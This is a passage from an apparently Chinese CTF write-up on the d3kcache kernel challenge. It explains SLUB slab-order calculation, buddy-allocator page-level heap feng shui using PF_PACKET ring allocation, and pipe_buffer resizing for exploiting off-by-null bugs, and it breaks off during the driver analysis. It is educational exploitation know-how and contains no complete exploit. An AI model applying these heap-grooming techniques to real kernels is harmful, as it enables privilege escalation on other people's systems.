min_objects,\t\t\t\t\tslub_max_order, fraction);\t\t\tif (order &lt;= slub_max_order)\t\t\t\treturn order;\t\t\tfraction /= 2;\t\t&#125;\t\tmin_objects--;\t&#125;\t/*\t * We were unable to place multiple objects in a slab. Now\t * lets see if we can place a single object there.\t */\torder = calc_slab_order(size, 1, slub_max_order, 1);\tif (order &lt;= slub_max_order)\t\treturn order;\t/*\t * Doh this slab cannot be placed using slub_max_order.\t */\torder = calc_slab_order(size, 1, MAX_ORDER, 1);\tif (order &lt; MAX_ORDER)\t\treturn order;\treturn -ENOSYS;&#125;\n\n可以注意到最终的order是由calc_slab_order函数生成的。而这里的min_objects变量可以看到是由slub_min_objects赋值的。这个全局变量的含义是：每个slab的最小object数量，在没有配置的情况下是0。不过可以看到如果是0的话会进入到紧接着的if语句内，内部的nr_cpu_ids变量的值是处理器数。fls 可以获取参数的最高有效 bit 的位数，比如 fls(0)=0，fls(1)=1，fls(4) = 3。如果当前系统中有4个cpu，那么 min_object 的初始值为 4*(3+1) = 16。\n~ cat /proc/kallsyms | grep slub_min_objectsffffffff8a23b2d0 t __cfi_setup_slub_min_objectsffffffff8a23b2e0 t setup_slub_min_objectsffffffff8a4348af t __setup_str_setup_slub_min_objectsffffffff8a45e460 t __setup_setup_slub_min_objectsffffffff8b3d5fbc b slub_min_objects------pwndbg&gt; x/1xw 0xffffffff8b3d5fbc0xffffffff8b3d5fbc:\t0x00000000pwndbg&gt; \n\n~ cat /proc/kallsyms | grep nr_cpu_idsffffffff97f73fa8 D nr_cpu_idsffffffff98025f10 T __cfi_setup_nr_cpu_idsffffffff98025f20 T setup_nr_cpu_idsffffffff990f3098 b rcu_init_geometry.old_nr_cpu_ids------pwndbg&gt; x/1xw 0xffffffff97f73fa80xffffffff97f73fa8:\t0x00000004pwndbg&gt; \n\n按照上述步骤查看之后可以看到nr_cpu_ids的值为4，所以这里的min_object的值为0x10。\n而函数中fraction是对于碎片的一种指标。碎片大小不能超过 (slab所占内存大小 / fraction)，fraction 值越大，slab 中所能容忍的碎片就越小。\ncalc_slab_order函数int ilog2(unsigned long v)&#123;\tint l = 0;\twhile ((1UL &lt;&lt; l) &lt; v)\t\tl++;\treturn l;&#125;static __always_inline __attribute_const__ int get_order(unsigned long size)&#123;\tif (__builtin_constant_p(size)) &#123;\t\tif (!size)\t\t\treturn BITS_PER_LONG - PAGE_SHIFT;\t\tif (size &lt; (1UL &lt;&lt; PAGE_SHIFT))\t\t\treturn 0;\t\treturn ilog2((size) - 1) - PAGE_SHIFT + 1;\t&#125;\tsize--;\tsize &gt;&gt;= PAGE_SHIFT;#if BITS_PER_LONG == 32\treturn fls(size);#else\treturn fls64(size);#endif&#125;static inline unsigned int calc_slab_order(unsigned int size,\t\tunsigned int min_objects, unsigned int max_order,\t\tunsigned int fract_leftover)&#123;\tunsigned int min_order = slub_min_order;\tunsigned int order;\tif (order_objects(min_order, size) &gt; MAX_OBJS_PER_PAGE)\t\treturn get_order(size * MAX_OBJS_PER_PAGE) - 1;\tfor (order = max(min_order, (unsigned int)get_order(min_objects * size));\t\t\torder &lt;= max_order; order++) &#123;\t\tunsigned int slab_size = (unsigned int)PAGE_SIZE &lt;&lt; order;\t\tunsigned int rem;\t\trem = slab_size % size;\t\tif (rem &lt;= slab_size / fract_leftover)\t\t\tbreak;\t&#125;\treturn order;&#125;\n\n这个函数就是最终计算出order的函数了，可以看到这里会从slab所需要的最小order到最大order之间开始遍历，查找能够使slab碎片最小的order值。而rem则是slab的碎片大小：分配完object之后，所产生的碎片大小。碎片大小rem不能超过slab_size / fract_leftover即符合要求。\n这里的get_order函数也较为简单，这狗屎玩意，开始看错了文件导致一直看不懂，硬生生看了两个小时才反应过来了。也就是根据size返回对应的最小的order，所以这里的如果根据上一个函数中的min_object的值为0x10来看的话，最终返回的order也就是3。\nstatic inline unsigned int order_objects(unsigned int order, unsigned int size)&#123;\treturn ((unsigned int)PAGE_SIZE &lt;&lt; order) / size;&#125;static inline struct kmem_cache_order_objects oo_make(unsigned int order,\t\tunsigned int size)&#123;\tstruct kmem_cache_order_objects x = &#123;\t\t(order &lt;&lt; OO_SHIFT) + order_objects(order, size)\t&#125;;\treturn x;&#125;\n\n最后由oo_make函数写入到oo成员中去了。\nkmem_cache_alloc流程可以看到前面kmem_cache_create_usercopy函数只是对kmem_cache结构体里面的成员进行初始化赋值，并没有实质性的生成slab。而真正分配slab是在第一次对这个cache申请object的时候，也就是这个小标题的函数。\n这里的调用流程就是：kmem_cache_alloc=&gt;__kmem_cache_alloc_lru=&gt;slab_alloc=&gt;slab_alloc_node=&gt;__slab_alloc_node=&gt;new_slab=&gt;allocate_slab=&gt;alloc_slab_page\n__slab_alloc_node函数static void *__slab_alloc_node(struct kmem_cache *s,\t\tgfp_t gfpflags, int node, unsigned long addr, size_t orig_size)&#123;\tstruct partial_context pc;\tstruct slab *slab;\tvoid *object;\tpc.flags = gfpflags;\tpc.slab = &amp;slab;\tpc.orig_size = orig_size;\tobject = get_partial(s, node, &amp;pc);\tif (object)\t\treturn object;\tslab = new_slab(s, gfpflags, node);\tif (unlikely(!slab)) &#123;\t\tslab_out_of_memory(s, gfpflags, node);\t\treturn NULL;\t&#125;\tobject = alloc_single_from_new_slab(s, slab, orig_size);\treturn object;&#125;\n\n可以看到分配顺序就是首先访问partial指针中，如果其中没有可以返回的object就会执行到new_slab函数分配新的slab。\nalloc_single_from_new_slab函数static void *alloc_single_from_new_slab(struct kmem_cache *s,\t\t\t\t\tstruct slab *slab, int orig_size)&#123;\tint nid = slab_nid(slab);\tstruct kmem_cache_node *n = get_node(s, nid);\tunsigned long flags;\tvoid *object;\tobject = slab-&gt;freelist;\tslab-&gt;freelist = get_freepointer(s, object);\tslab-&gt;inuse = 1;\tif (!alloc_debug_processing(s, slab, object, orig_size))\t\t/*\t\t * It&#x27;s not really expected that this would fail on a\t\t * freshly allocated slab, but a concurrent memory\t\t * corruption in theory could cause that.\t\t */\t\treturn NULL;\tspin_lock_irqsave(&amp;n-&gt;list_lock, flags);\tif (slab-&gt;inuse == slab-&gt;objects)\t\tadd_full(s, n, slab);\telse\t\tadd_partial(n, slab, DEACTIVATE_TO_HEAD);\tinc_slabs_node(s, nid, slab-&gt;objects);\tspin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);\treturn object;&#125;\n\n这里主要做的事就是首先取下freelist指向的object，随后将slab添加到partial指针处。\nallocate_slab函数上面提到了new_slab函数，其实实质上调用的是这个函数\nstatic struct slab *allocate_slab(struct kmem_cache *s, gfp_t flags, int node)&#123;\tstruct slab *slab;\tstruct kmem_cache_order_objects oo = s-&gt;oo;\tgfp_t alloc_gfp;\tvoid *start, *p, *next;\tint idx;\tbool shuffle;\t... ...\tslab = alloc_slab_page(alloc_gfp, node, oo);\tif (unlikely(!slab)) &#123;\t\too = s-&gt;min;\t\talloc_gfp = flags;\t\t/*\t\t * Allocation may have failed due to fragmentation.\t\t * Try a lower order alloc if possible\t\t */\t\tslab = alloc_slab_page(alloc_gfp, node, oo);\t\tif (unlikely(!slab))\t\t\treturn NULL;\t\tstat(s, ORDER_FALLBACK);\t&#125;\tslab-&gt;objects = oo_objects(oo);\tslab-&gt;inuse = 0;\tslab-&gt;frozen = 0;\taccount_slab(slab, oo_order(oo), s, flags);\tslab-&gt;slab_cache = s;\tkasan_poison_slab(slab);\tstart = slab_address(slab);\tsetup_slab_debug(s, slab, start);\tshuffle = shuffle_freelist(s, slab);\tif (!shuffle) &#123;\t\tstart = fixup_red_left(s, start);\t\tstart = setup_object(s, start);\t\tslab-&gt;freelist = start;\t\tfor (idx = 0, p = start; idx &lt; slab-&gt;objects - 1; idx++) &#123;\t\t\tnext = p + s-&gt;size;\t\t\tnext = setup_object(s, next);\t\t\tset_freepointer(s, p, next);\t\t\tp = next;\t\t&#125;\t\tset_freepointer(s, p, NULL);\t&#125;\treturn slab;&#125;\n\n这里对于新分配的slab首先写的就是他的freelist指针，所以根据上面外层函数的调用顺序来看，在刚挂载到freelist紧接着就会返回object并重新挂载到partial上。\n也可以看到这个函数中调用了在slab分配分析开头给出的函数alloc_slab_page。\n页级堆风水构造终于要说到跟题目有关系的内容了。\n如果提到一个驱动存在off by null或者off by one漏洞时，我的第一反应就是这个CVE-2021-22555中的办法，使用大量堆喷来完成。但是如果题目的slab是由kmem_cache_create_usercopy创建的话困难就会存在很大的问题了，如果你当前使用堆喷的堆块的order与创建的cache不一致，这样只有极低的概率可以让驱动生成的slab紧邻堆喷的slab。所以为了提高脚本的稳定性，出现了这一利用手法。\n其实这一手法以前在安全客中有看到但是当时并没有在意，所以现在借着墨晚鸢佬的博客学习一下。页级堆风水即以内存页为粒度的内存排布方式，而内核内存页的排布对我们来说不仅未知且信息量巨大，因此这种利用手法实际上是让我们手工构造一个新的已知的页级粒度内存页排布。\n在上述解释完slab的分配过程想必应该都能理解buddy system了，他的基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同 order 间空闲页面构成双向链表，当低阶 order 的页面不够用时便会从高阶 order 取一份连续内存页拆成两半，其中一半挂回当前请求 order 链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system 页面分配基本原理（偷的图）：\n\n不难想到这个利用方式的原理就是：从更高阶 order 拆分成的两份低阶 order 的连续内存页是物理连续的，由此我们可以：\n\n  向 buddy system 请求两份连续的内存页\n  释放其中一份内存页，分配 vulnerable kmem_cache ，让其取走这份内存页\n  释放另一份内存页，使用 victim kmem_cache 堆喷，让其取走这份内存页\n\n那么此时我们可以使用vulnerable kmem_cache的off by null或off by one去修改到victim kmem_cache了。\n分配任意数量任意大小page根据上述内容来看，我们需要消耗掉小order的页面才能继续进行，这也就意味着我们需要一个可以申请指定order的API。这里选择是CVE-2017-7308中的方法。\n当我们创建一个 protocol 为 PF_PACKET 的 socket 之后，先调用 setsockopt() 将 PACKET_VERSION 设为 TPACKET_V1 / TPACKET_V2，再调用 setsockopt() 提交一个 PACKET_TX_RING ，此时便存在如下调用链：\n__sys_setsockopt=&gt;sock-&gt;ops-&gt;setsockopt=&gt;packet_setsockopt=&gt;packet_set_ring=&gt;alloc_pg_vec\nstatic struct pgv *alloc_pg_vec(struct tpacket_req *req, int order)&#123;\tunsigned int block_nr = req-&gt;tp_block_nr;\tstruct pgv *pg_vec;\tint i;\tpg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN);\tif (unlikely(!pg_vec))\t\tgoto out;\tfor (i = 0; i &lt; block_nr; i++) &#123;\t\tpg_vec[i].buffer = alloc_one_pg_vec_page(order);\t\tif (unlikely(!pg_vec[i].buffer))\t\t\tgoto out_free_pgvec;\t&#125;out:\treturn pg_vec;out_free_pgvec:\tfree_pg_vec(pg_vec, order, block_nr);\tpg_vec = NULL;\tgoto out;&#125;\n\n可以看到的是这里alloc_pg_vec函数通过alloc_one_pg_vec_page函数申请buffer。并且这里申请的数量为req-&gt;tp_block_nr而req是用户可控的，所以这里申请的数量是可控的。\nstatic char *alloc_one_pg_vec_page(unsigned long order)&#123;\tchar *buffer;\tgfp_t gfp_flags = GFP_KERNEL | __GFP_COMP |\t\t\t  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;\tbuffer = (char *) __get_free_pages(gfp_flags, order);\tif (buffer)\t\treturn buffer;\t/* __get_free_pages failed, fall back to vmalloc */\tbuffer = vzalloc(array_size((1 &lt;&lt; order), PAGE_SIZE));\tif (buffer)\t\treturn buffer;\t/* vmalloc failed, lets dig into swap here */\tgfp_flags &amp;= ~__GFP_NORETRY;\tbuffer = (char *) __get_free_pages(gfp_flags, order);\tif (buffer)\t\treturn buffer;\t/* complete and utter failure */\treturn NULL;&#125;\n\n而alloc_one_pg_vec_page函数使用__get_free_pages申请到page。\npacket_setsockopt(struct socket *sock, int level, int optname, sockptr_t optval,\t\t  unsigned int optlen)&#123;\tstruct sock *sk = sock-&gt;sk;\tstruct packet_sock *po = pkt_sk(sk);\tint ret;\tif (level != SOL_PACKET)\t\treturn -ENOPROTOOPT;\tswitch (optname) &#123;\tcase PACKET_ADD_MEMBERSHIP:\tcase PACKET_DROP_MEMBERSHIP:\t&#123;\t\tstruct packet_mreq_max mreq;\t\tint len = optlen;\t\tmemset(&amp;mreq, 0, sizeof(mreq));\t\tif (len &lt; sizeof(struct packet_mreq))\t\t\treturn -EINVAL;\t\tif (len &gt; sizeof(mreq))\t\t\tlen = sizeof(mreq);\t\tif (copy_from_sockptr(&amp;mreq, optval, len))\t\t\treturn -EFAULT;\t\tif (len &lt; (mreq.mr_alen + offsetof(struct packet_mreq, mr_address)))\t\t\treturn -EINVAL;\t\tif (optname == PACKET_ADD_MEMBERSHIP)\t\t\tret = packet_mc_add(sk, &amp;mreq);\t\telse\t\t\tret = packet_mc_drop(sk, &amp;mreq);\t\treturn ret;\t&#125;\tcase PACKET_RX_RING:\tcase PACKET_TX_RING:\t&#123;\t\tunion tpacket_req_u req_u;\t\tint len;\t\tlock_sock(sk);\t\tswitch (po-&gt;tp_version) &#123;\t\tcase TPACKET_V1:\t\tcase TPACKET_V2:\t\t\tlen = sizeof(req_u.req);\t\t\tbreak;\t\tcase TPACKET_V3:\t\tdefault:\t\t\tlen = sizeof(req_u.req3);\t\t\tbreak;\t\t&#125;\t\tif (optlen &lt; len) &#123;\t\t\tret = -EINVAL;\t\t&#125; else &#123;\t\t\tif (copy_from_sockptr(&amp;req_u.req, optval, len))\t\t\t\tret = -EFAULT;\t\t\telse\t\t\t\tret = packet_set_ring(sk, &amp;req_u, 0,\t\t\t\t\t\t    optname == PACKET_TX_RING);\t\t&#125;\t\trelease_sock(sk);\t\treturn ret;\t&#125;      ... ...  &#125;&#125;\n\n可以看到当我们的optname为PACKET_TX_RING时会调用到packet_set_ring，因为此时len的关系，我们还需要设置po-&gt;tp_version为TPACKET_V1/TPACKET_V2。\ncase PACKET_VERSION:\t&#123;\t\tint val;\t\tif (optlen != sizeof(val))\t\t\treturn -EINVAL;\t\tif (copy_from_sockptr(&amp;val, optval, sizeof(val)))\t\t\treturn -EFAULT;\t\tswitch (val) &#123;\t\tcase TPACKET_V1:\t\tcase TPACKET_V2:\t\tcase TPACKET_V3:\t\t\tbreak;\t\tdefault:\t\t\treturn -EINVAL;\t\t&#125;\t\tlock_sock(sk);\t\tif (po-&gt;rx_ring.pg_vec || po-&gt;tx_ring.pg_vec) &#123;\t\t\tret = -EBUSY;\t\t&#125; else &#123;\t\t\tpo-&gt;tp_version = val;\t\t\tret = 0;\t\t&#125;\t\trelease_sock(sk);\t\treturn ret;\t&#125;\n\n想要修改到po-&gt;tp_version需要进入到这个case，所以需要进行两次调用。\nstatic int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,\t\tint closing, int tx_ring)&#123;\tstruct pgv *pg_vec = NULL;\tstruct packet_sock *po = pkt_sk(sk);\tunsigned long *rx_owner_map = NULL;\tint was_running, order = 0;\tstruct packet_ring_buffer *rb;\tstruct sk_buff_head *rb_queue;\t__be16 num;\tint err;\t/* Added to avoid minimal code churn */\tstruct tpacket_req *req = &amp;req_u-&gt;req;\trb = tx_ring ? &amp;po-&gt;tx_ring : &amp;po-&gt;rx_ring;\trb_queue = tx_ring ? &amp;sk-&gt;sk_write_queue : &amp;sk-&gt;sk_receive_queue;\terr = -EBUSY;\tif (!closing) &#123;\t\tif (atomic_read(&amp;po-&gt;mapped))\t\t\tgoto out;\t\tif (packet_read_pending(rb))\t\t\tgoto out;\t&#125;\tif (req-&gt;tp_block_nr) &#123;\t\tunsigned int min_frame_size;\t\t... ...\t\terr = -ENOMEM;\t\torder = get_order(req-&gt;tp_block_size);\t\tpg_vec = alloc_pg_vec(req, order);    ... ...  &#125;  ... ...  if (closing || atomic_read(&amp;po-&gt;mapped) == 0) &#123;\t\terr = 0;\t\tspin_lock_bh(&amp;rb_queue-&gt;lock);\t\tswap(rb-&gt;pg_vec, pg_vec);\t\tif (po-&gt;tp_version &lt;= TPACKET_V2)\t\t\tswap(rb-&gt;rx_owner_map, rx_owner_map);\t\trb-&gt;frame_max = (req-&gt;tp_frame_nr - 1);\t\trb-&gt;head = 0;\t\trb-&gt;frame_size = req-&gt;tp_frame_size;\t\tspin_unlock_bh(&amp;rb_queue-&gt;lock);\t\tswap(rb-&gt;pg_vec_order, order);\t\tswap(rb-&gt;pg_vec_len, req-&gt;tp_block_nr);\t\trb-&gt;pg_vec_pages = req-&gt;tp_block_size/PAGE_SIZE;\t\tpo-&gt;prot_hook.func = (po-&gt;rx_ring.pg_vec) ?\t\t\t\t\t\ttpacket_rcv : packet_rcv;\t\tskb_queue_purge(rb_queue);\t\tif (atomic_read(&amp;po-&gt;mapped))\t\t\tpr_err(&quot;packet_mmap: vma is busy: %d\\n&quot;,\t\t\t       atomic_read(&amp;po-&gt;mapped));\t&#125;  ... ...out_free_pg_vec:\tif (pg_vec) &#123;\t\tbitmap_free(rx_owner_map);\t\tfree_pg_vec(pg_vec, order, req-&gt;tp_block_nr);\t&#125;out:\treturn err;&#125;\n\n可以看到这里的order是由req-&gt;tp_block_size确定的，而且req是用户可以控制的，所以这里的申请的page的order也是可控的。并且需要注意的是在if (closing || atomic_read(&amp;po-&gt;mapped) == 0)这个条件分支中，会交换rb-&gt;pg_vec中的内容和当前函数中变量pg_vec中的内容，所以在最后不会执行到free_pg_vec函数。\n释放这里的释放流程很简单：packet_release=&gt;packet_set_ring=&gt;free_pg_vec\nstatic void free_pg_vec(struct pgv *pg_vec, unsigned int order,\t\t\tunsigned int len)&#123;\tint i;\tfor (i = 0; i &lt; len; i++) &#123;\t\tif (likely(pg_vec[i].buffer)) &#123;\t\t\tif (is_vmalloc_addr(pg_vec[i].buffer))\t\t\t\tvfree(pg_vec[i].buffer);\t\t\telse\t\t\t\tfree_pages((unsigned long)pg_vec[i].buffer,\t\t\t\t\t   order);\t\t\tpg_vec[i].buffer = NULL;\t\t&#125;\t&#125;\tkfree(pg_vec);&#125;\n\n可以看到就是将里面的内容给释放掉。\nstatic int packet_release(struct socket *sock)&#123;\tstruct sock *sk = sock-&gt;sk;\tstruct packet_sock *po;\tstruct packet_fanout *f;\tstruct net *net;\tunion tpacket_req_u req_u;\tif (!sk)\t\treturn 0;\t... ...\tlock_sock(sk);\tif (po-&gt;rx_ring.pg_vec) &#123;\t\tmemset(&amp;req_u, 0, sizeof(req_u));\t\tpacket_set_ring(sk, &amp;req_u, 1, 0);\t&#125;\tif (po-&gt;tx_ring.pg_vec) &#123;\t\tmemset(&amp;req_u, 0, sizeof(req_u));\t\tpacket_set_ring(sk, &amp;req_u, 1, 1);\t&#125;  ... ...&#125;\n\n很容易注意到的是都调用的packet_set_ring函数，而在packet_release函数中所给的参数中第三个参数为1。\nstatic int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,\t\tint closing, int tx_ring)\n\n对比函数声明可以看出来这个参数就代表要关闭了，并且在执行这个函数之前memset(&amp;req_u, 0, sizeof(req_u));执行了这样一条语句，也就导致req中的所有内容都为\\x00，也就不进入分配的分支中去了。不过依旧会进入到进行各种swap的分支，因为在分配时走过一次，所以这次最后会调用到free_pg_vec函数了，而这个函数在这里说了就是释放掉所有页面。\n总结当我们耗尽 buddy system 中的 low order pages 后，我们再请求的页面便都是物理连续的，因此此时我们再进行 setsockopt() 便相当于获取到了一块近乎物理连续的内存（为什么是”近乎连续“是因为大量的 setsockopt() 流程中同样会分配大量我们不需要的结构体，从而消耗 buddy system 的部分页面）。\n所以这里的使用流程就是，先使用上述办法进行堆喷。\n\n  释放一部分order为3的page，接着使用victim object进行申请这些页面\n  释放一个页面，使用vuln object申请这一页面\n  释放一部分order为3的page，再次让victim object申请到\n\n\n最终实现上图这样的效果。\npipe_buffer在以往的文章中出现了很多次的pipe_buffer，但是可惜的是使用的方式过于简单。比如，只是简单的利用他的ops指针进行泄漏或者覆盖它控制执行流，再就是Dirty Pipe中的利用。可恨的是我在做题的过程中并没有想到使用Dirty Pipe，即便是当时我已经对pipe_buffer所在的堆块上有绝对的权限了。所以这里就不再只是对其ops的利用了，后面主要就是破坏其page指针了。\npipe_buffer分配过程#define PIPE_DEF_BUFFERS\t16struct pipe_inode_info *alloc_pipe_info(void)&#123;\tstruct pipe_inode_info *pipe;\tunsigned long pipe_bufs = PIPE_DEF_BUFFERS;\tstruct user_struct *user = get_current_user();\tunsigned long user_bufs;\tunsigned int max_size = READ_ONCE(pipe_max_size);\tpipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);\tif (pipe == NULL)\t\tgoto out_free_uid;\tif (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))\t\tpipe_bufs = max_size &gt;&gt; PAGE_SHIFT;\tuser_bufs = account_pipe_buffers(user, 0, pipe_bufs);\tif (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) &#123;\t\tuser_bufs = account_pipe_buffers(user, pipe_bufs, PIPE_MIN_DEF_BUFFERS);\t\tpipe_bufs = PIPE_MIN_DEF_BUFFERS;\t&#125;\tif (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())\t\tgoto out_revert_acct;\tpipe-&gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),\t\t\t     GFP_KERNEL_ACCOUNT);\tif (pipe-&gt;bufs) &#123;\t\tinit_waitqueue_head(&amp;pipe-&gt;rd_wait);\t\tinit_waitqueue_head(&amp;pipe-&gt;wr_wait);\t\tpipe-&gt;r_counter = pipe-&gt;w_counter = 1;\t\tpipe-&gt;max_usage = pipe_bufs;\t\tpipe-&gt;ring_size = pipe_bufs;\t\tpipe-&gt;nr_accounted = pipe_bufs;\t\tpipe-&gt;user = user;\t\tmutex_init(&amp;pipe-&gt;mutex);\t\treturn pipe;\t&#125;out_revert_acct:\t(void) account_pipe_buffers(user, pipe_bufs, 0);\tkfree(pipe);out_free_uid:\tfree_uid(user);\treturn NULL;&#125;\n\n可以看到在后面申请pipe-&gt;bufs使用了kcalloc函数，而这个函数的第一个参数分配的数量，第二参数就是每一个单位的大小。其实在其内部中也是会将这两个参数相乘起来的，而这两个值其实都是已知的，第一个为16，第二个为40，那么他们的结果就是640。\nstruct kmem_cache *kmalloc_slab(size_t size, gfp_t flags)&#123;\tunsigned int index;\tif (size &lt;= 192) &#123;\t\tif (!size)\t\t\treturn ZERO_SIZE_PTR;\t\tindex = size_index[size_index_elem(size)];\t&#125; else &#123;\t\tif (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))\t\t\treturn NULL;\t\tindex = fls(size - 1);\t&#125;\treturn kmalloc_caches[kmalloc_type(flags)][index];&#125;\n\n在kcalloc函数中会到这里进行选择cache\nconst struct kmalloc_info_struct kmalloc_info[] __initconst = &#123;\tINIT_KMALLOC_INFO(0, 0),\tINIT_KMALLOC_INFO(96, 96),\tINIT_KMALLOC_INFO(192, 192),\tINIT_KMALLOC_INFO(8, 8),\tINIT_KMALLOC_INFO(16, 16),\tINIT_KMALLOC_INFO(32, 32),\tINIT_KMALLOC_INFO(64, 64),\tINIT_KMALLOC_INFO(128, 128),\tINIT_KMALLOC_INFO(256, 256),\tINIT_KMALLOC_INFO(512, 512),\tINIT_KMALLOC_INFO(1024, 1k),\tINIT_KMALLOC_INFO(2048, 2k),\tINIT_KMALLOC_INFO(4096, 4k),\tINIT_KMALLOC_INFO(8192, 8k),\tINIT_KMALLOC_INFO(16384, 16k),\tINIT_KMALLOC_INFO(32768, 32k),\tINIT_KMALLOC_INFO(65536, 64k),\tINIT_KMALLOC_INFO(131072, 128k),\tINIT_KMALLOC_INFO(262144, 256k),\tINIT_KMALLOC_INFO(524288, 512k),\tINIT_KMALLOC_INFO(1048576, 1M),\tINIT_KMALLOC_INFO(2097152, 2M)&#125;;\n\n很明显这里选择的是kmalloc-cg-1k。然而，kmalloc-cg-1k来自于order为2的页面。但是根据前面的意思我们需要order为3的页面出来的，所以如果这里申请的页面order为2的话成功率会大打折扣。\npipe_buffer修改分配大小pipe给人的惊喜是不断的，pipe可以提供了fcntl(F_SETPIPE_SZ)调用去修改每个pipe中pipe_buffer的数量。\nstatic long pipe_set_size(struct pipe_inode_info *pipe, unsigned long arg)&#123;\tunsigned long user_bufs;\tunsigned int nr_slots, size;\tlong ret = 0;#ifdef CONFIG_WATCH_QUEUE\tif (pipe-&gt;watch_queue)\t\treturn -EBUSY;#endif    size = round_pipe_size(arg);\tnr_slots = size &gt;&gt; PAGE_SHIFT;\tif (!nr_slots)\t\treturn -EINVAL;\t... ...\tret = pipe_resize_ring(pipe, nr_slots);\tif (ret &lt; 0)\t\tgoto out_revert_acct;\tpipe-&gt;max_usage = nr_slots;\tpipe-&gt;nr_accounted = nr_slots;\treturn pipe-&gt;max_usage * PAGE_SIZE;out_revert_acct:\t(void) account_pipe_buffers(pipe-&gt;user, nr_slots, pipe-&gt;nr_accounted);\treturn ret;&#125;\n\n这个函数中会调用到pipe_resize_ring函数，这里会根据size得到nr_slots，而在调用pipe_resize_ring函数时nr_slots为第二个参数。\nint pipe_resize_ring(struct pipe_inode_info *pipe, unsigned int nr_slots)&#123;\tstruct pipe_buffer *bufs;\tunsigned int head, tail, mask, n;\tbufs = kcalloc(nr_slots, sizeof(*bufs),\t\t       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);\tif (unlikely(!bufs))\t\treturn -ENOMEM;\tspin_lock_irq(&amp;pipe-&gt;rd_wait.lock);\tmask = pipe-&gt;ring_size - 1;\thead = pipe-&gt;head;\ttail = pipe-&gt;tail;\tn = pipe_occupancy(head, tail);\tif (nr_slots &lt; n) &#123;\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);\t\tkfree(bufs);\t\treturn -EBUSY;\t&#125;\t... ...\treturn 0;&#125;\n\n可以注意到的是在这个函数开头的位置就调用了kcalloc函数，而这个函数的第一个参数就是我们可以通过fcntl调用修改的。如果，nr_slots的值为64，那么申请的size即为0xa00则会申请kmalloc-4k，此时order为3，可以大大提高成功率。\nstatic inline int calculate_order(unsigned int size)&#123;\tunsigned int order;\tunsigned int min_objects;\tunsigned int max_objects;\tunsigned int nr_cpus;\t/*\t * Attempt to find best configuration for a slab. This\t * works by first attempting to generate a layout with\t * the best configuration and backing off gradually.\t *\t * First we increase the acceptable waste in a slab. Then\t * we reduce the minimum objects required in a slab.\t */\tmin_objects = slub_min_objects;\tif (!min_objects) &#123;\t\t/*\t\t * Some architectures will only update present cpus when\t\t * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But\t\t * we also don&#x27;t want to use nr_cpu_ids always, as on some other\t\t * architectures, there can be many possible cpus, but never\t\t * onlined. Here we compromise between trying to avoid too high\t\t * order on systems that appear larger than they are, and too\t\t * low order on systems that appear smaller than they are.\t\t */\t\tnr_cpus = num_present_cpus();\t\tif (nr_cpus &lt;= 1)\t\t\tnr_cpus = nr_cpu_ids;\t\tmin_objects = 4 * (fls(nr_cpus) + 1);\t&#125;\tmax_objects = order_objects(slub_max_order, size);\tmin_objects = min(min_objects, max_objects);\t... ...&#125;\n\n可能各位会疑惑为什么kmalloc-4k的order为3，这里重新看calculate_order函数，可以看到在对min_objects变量赋值的最后一个操作就是选取最小的。\nstatic inline unsigned int order_objects(unsigned int order, unsigned int size)&#123;\treturn ((unsigned int)PAGE_SIZE &lt;&lt; order) / size;&#125;\n\n而order_objects函数内部是这样的，并且此时slub_max_order的值为3，所以当size为4k时也就是0x1000时max_objects的值为0x8，所以按照这样计算的话后续求得的order为3。\nd3kcache前面铺垫了这么多终于到了题目了，如果有了前面提到的所有基础理论知识再来看这道题的话，依旧无法很轻松的完成。\n题目在开了基本的保护之外还开启了很多的编译选项中的保护\nCONFIG_STATIC_USERMODEHELPER=yCONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;CONFIG_SLUB=yCONFIG_SLAB_FREELIST_RANDOM=yCONFIG_SLAB_FREELIST_HARDENED=yCONFIG_HARDENED_USERCOPY=y\n\n这些基本的都是开启了的，除此之外还开启了一个Control Flow Integrity保护。\nCONFIG_CFI_CLANG=y\n\n而这个保护会检测ops是否合法，这个检测十分严格，需要ops的值与一个固定的内容进行异或，结果不为0就直接触发kernel panic。也就是因为当时不清楚这个内容导致我调了半天去劫持pipe_buffer的ops指针。\n驱动分析__int64 init_module()&#123;  unsigned int v0; // ebx  printk(&amp;unk_96B);  major_num = _register_chrdev(0LL, 0LL, 256LL, &quot;d3kcache&quot;, &amp;d3kcache_fo);  if ( major_num &gt;= 0 )  &#123;    module_class = _class_create(&amp;_this_module, &quot;d3kcache&quot;, &amp;d3kcache_module_init___key);    if ( (unsigned __int64)module_class &lt; 0xFFFFFFFFFFFFF001LL )    &#123;      printk(&amp;unk_A0D);      v0 = 0;      module_device = device_create(module_class, 0LL, (unsigned int)(major_num &lt;&lt; 20), 0LL, &quot;d3kcache&quot;);      if ( (unsigned __int64)module_device &lt; 0xFFFFFFFFFFFFF001LL )      &#123;        printk(&amp;unk_A66);        spin = 0;        kcache_jar = kmem_cache_create_usercopy(&quot;kcache_jar&quot;, 0x800LL, 0LL, 67379200LL, 0LL, 2048LL, 0LL);        memset(kcache_list, 0, 0x100uLL);      &#125;      else      &#123;        class_destroy(module_class);        _unregister_chrdev((unsigned int)major_num, 0LL, 256LL, &quot;d3kcache&quot;);        printk(&amp;unk_A3B);        return (unsigned int)module_device;      &#125;    &#125;    else    &#123;      _unregister_chrdev((unsigned int)major_num, 0LL, 256LL, &quot;d3kcache&quot;);      printk(&amp;unk_9DE);      return (unsigned int)module_class;    &#125;  &#125;  else  &#123;    printk(&amp;unk_9AD);    return (unsigned int)major_num;  &#125;  return 